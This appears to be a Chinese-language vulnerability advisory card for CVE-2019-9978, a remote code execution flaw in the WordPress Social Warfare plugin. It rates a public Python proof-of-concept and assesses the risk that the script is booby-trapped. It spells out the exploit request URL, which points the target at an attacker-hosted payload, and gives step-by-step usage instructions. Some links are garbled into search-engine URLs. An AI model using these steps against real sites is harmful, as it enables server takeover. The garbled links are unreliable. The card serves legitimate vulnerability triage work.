## CVE-2019-9978 - WordPress Social Warfare Plugin RCE/XSS

**漏洞编号:** CVE-2019-9978

**漏洞类型:** RCE/XSS

**影响应用:** WordPress Social Warfare Plugin

**危害等级:** CRITICAL

**CVSS评分:** 9.8 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**影响版本:** < 3.5.3

**利用条件:** 无需认证，可通过网络直接访问受影响的WordPress站点

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

【POC有效性分析】该POC脚本针对WordPress Social Warfare插件3.5.3之前版本中的输入验证漏洞。漏洞核心在于wp-admin/admin-post.php中的swp_debug=load_options操作，它允许通过swp_url参数传入一个外部URL。插件会获取该URL的内容并将其传递给eval()函数执行，从而导致远程代码执行（RCE）。经分析，此Python POC脚本逻辑完整：它首先在本地启动一个HTTP服务器，托管包含PHP system()函数的恶意负载（Payload），然后构造一个HTTP请求发送给目标WordPress站点。目标服务器在接收请求后会反向访问攻击者的本地服务器，获取该Payload并执行指定的系统命令。脚本利用了多线程技术处理本地HTTP服务，自动化程度极高，能够直接在命令行中获取执行结果，验证了漏洞的真实有效性。此外，如果负载中包含HTML脚本，该漏洞也可被用于存储型XSS攻击。【利用步骤】1. 环境准备：确保攻击机安装了Python 3及requests库。2. 配置参数：使用-u参数指定目标网站URL，-c参数指定要在目标机执行的命令（如id或uname -a），-l指定攻击机用于接收回调的IP和端口。3. 执行攻击：运行脚本后，脚本会自动开启本地HTTP端口，https://www.google.com/search?q=%E5%B9%B6%E5%8F%91%E9%80%81%E7%B2%BE%E5%BF%83%E6%9E%84%E9%80%A0%E7%9A%84GET%E8%AF%B7%E6%B1%82%E8%87%B3target.com/wp-admin/admin-post.php%3Fswp_debug%3Dload_options%26swp_url%3Dhttp://LHOST:LPORT。4. 结果获取：目标服务器解析Payload后执行命令，脚本捕获响应并在终端显示输出。【投毒风险分析】从代码层面审视，该POC脚本逻辑清晰，使用了标准的Python库（http.server, threading, argparse, requests），未发现混淆代码、外部加密二进制文件下载或隐蔽的系统API调用。脚本中的核心逻辑是建立一个临时的HTTP服务器用于分发漏洞Payload，这是由漏洞本身的触发机制（SSRF导致的远程包含执行）决定的，而非恶意后门行为。虽然脚本具备强大的攻击性，但其代码透明度高，不属于针对安全研究员的投毒样本。潜在风险仅在于使用者若不具备分析能力，直接从不可信来源下载修改后的版本可能会被植入反弹Shell，但就当前代码而言，属于低投毒风险的安全工具。建议在隔离环境中使用此类POC进行防御性测试，并严格审计-l参数指定的网络通信路径。

**项目地址:** [https://github.com/vulnerabilities/cve-2019-9978](https://www.google.com/search?q=https://github.com/vulnerabilities/cve-2019-9978)

**漏洞详情:** [https://nvd.nist.gov/vuln/detail/CVE-2019-9978](https://nvd.nist.gov/vuln/detail/CVE-2019-9978)
